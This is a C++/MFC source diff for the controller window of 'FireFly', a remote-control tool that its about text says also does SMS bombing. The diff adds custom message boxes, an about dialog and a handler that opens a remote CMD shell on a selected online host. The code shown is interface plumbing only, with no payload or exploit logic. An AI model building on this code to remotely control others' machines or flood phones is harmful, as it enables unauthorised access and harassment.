@@ -7,20 +7,7 @@
 #include "FireFlyDlg.h"
 #include "afxdialogex.h"
 #include "GDIButton.h"
-
-#define IDC_BASE      10000
-#define IDC_BKG       IDC_BASE+1
-#define IDC_CLOSE_BT  IDC_BASE+2
-#define IDC_MIN_BT	  IDC_BASE+3
-#define IDC_SET_BT	  IDC_BASE+4
-#define IDC_MAINPAGE_BT	  IDC_BASE+5  //主页
-#define IDC_PROC_MANAGE_BT  IDC_BASE+6 //进程管理
-#define IDC_REMOTECMD_BT	IDC_BASE+7 //远程CMD
-#define IDC_FILE_BT			IDC_BASE+8 //文件管理
-#define IDC_SERVICE_BT		IDC_BASE+9 //服务管理
-#define IDC_SCREEN_BT		IDC_BASE+10 //屏幕截取
-#define IDC_SMS_BT			IDC_BASE+11 //短信轰炸
-#define IDC_ME_BT			IDC_BASE+12 //关于我
+#include "MessageBox.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -52,7 +39,7 @@ CFireFlyDlg::CFireFlyDlg(CWnd* pParent /*=NULL*/)
 	m_iListPress=-1;
 	m_bUpdataListView=FALSE;
 	m_Process=NULL;
-
+	m_Cmd=NULL;
 	m_rcTime.left=270,m_rcTime.top=578,m_rcTime.right=460,m_rcTime.bottom=596;
 	//文件图片管理类的加载方式
 	//pImage=CSkinManager::GetInstance()->GetSkinItem(L"bkg.jpg");
@@ -82,6 +69,8 @@ CFireFlyDlg::CFireFlyDlg(CWnd* pParent /*=NULL*/)
 	CMemoryImage::GetInstance()->ImageFromResource(IDB_SCREEN);//屏幕截取
 	CMemoryImage::GetInstance()->ImageFromResource(IDB_SMS);//短信轰炸
 	CMemoryImage::GetInstance()->ImageFromResource(IDB_ME);//关于我
+	CMemoryImage::GetInstance()->ImageFromResource(IDB_MESSAGEBOXDLG);//messagebox背景
+	CMemoryImage::GetInstance()->ImageFromResource(IDB_MESSAGEBOXBUTTON);//messagebox按钮
 }
 
 void CFireFlyDlg::DoDataExchange(CDataExchange* pDX)
@@ -103,6 +92,8 @@ BEGIN_MESSAGE_MAP(CFireFlyDlg, CDialogEx)
 	ON_MESSAGE(WM_ONLINE,&CFireFlyDlg::MyOnline) //自定义上线消息
 	ON_MESSAGE(WM_OFFLINE,&CFireFlyDlg::MyOffline) //自定义下线消息
 	ON_COMMAND(IDC_PROC_MANAGE_BT,&CFireFlyDlg::OnProcess)
+	ON_COMMAND(IDC_ME_BT,&CFireFlyDlg::OnME)
+	ON_COMMAND(IDC_REMOTECMD_BT,&CFireFlyDlg::OnCMD)
 END_MESSAGE_MAP()
 
 
@@ -740,9 +731,9 @@ LRESULT CFireFlyDlg::MyOffline(WPARAM wParam,LPARAM lParam)
 
 	//}
 
-	//if(m_CmdShell!=NULL)
+	//if(m_Cmd!=NULL)
 	//{
-	//	m_CmdShell->OnCancel();
+	//	m_Cmd->OnCancel();
 
 	//}
 
@@ -761,12 +752,18 @@ void CFireFlyDlg::OnProcess()
 	//ListView索引值不能大于主机数
 	if(m_iListPress==-1)
 	{
-		MessageBoxW(L"当前无在线主机！");
+		CString str=L"当前无主机在线！";
+		CString strTitle=L"进程管理";
+		CMessageBox mb(300,200,str,strTitle);
+		mb.DoModal();
 		return;
 	}
 	if(m_iListPress>g_ServArray.GetSize()-1)
 	{
-		MessageBoxW(L"请选择有效的主机！");
+		CString str=L"请选择有效的主机！";
+		CString strTitle=L"进程管理";
+		CMessageBox mb(300,200,str,strTitle);
+		mb.DoModal();
 		return;
 	}
 	if(m_Process==NULL)
@@ -781,4 +778,46 @@ void CFireFlyDlg:: MyDeleteProcess()
 {
 	delete m_Process;
 	m_Process=NULL;
+}
+
+void CFireFlyDlg::OnME()
+{
+	CString str=L"FireFly远程控制 附带短信轰炸功能----BY:石松岩";
+	CString strTitle=L"关于我";
+	CMessageBox mb(300,200,str,strTitle);
+	mb.DoModal();
+}
+
+void CFireFlyDlg::MyDeleteCMDShell()
+{
+	delete m_Cmd;
+	m_Cmd=NULL;
+}
+
+void CFireFlyDlg::OnCMD()
+{
+	//ListView索引值不能大于主机数
+	if(m_iListPress==-1)
+	{
+		CString str=L"当前无主机在线！";
+		CString strTitle=L"远程CMD";
+		CMessageBox mb(300,200,str,strTitle);
+		mb.DoModal();
+		return;
+	}
+	if(m_iListPress>g_ServArray.GetSize()-1)
+	{
+		CString str=L"请选择有效的主机！";
+		CString strTitle=L"远程CMD";
+		CMessageBox mb(300,200,str,strTitle);
+		mb.DoModal();
+		return;
+	}
+
+	if(m_Cmd==NULL)
+	{
+		m_Cmd=new CCmd(this,g_ServArray.GetAt(m_iListPress).sk);
+		m_Cmd->Create(IDD_CMDSHELL);
+		m_Cmd->ShowWindow(SW_SHOW);
+	}
 }
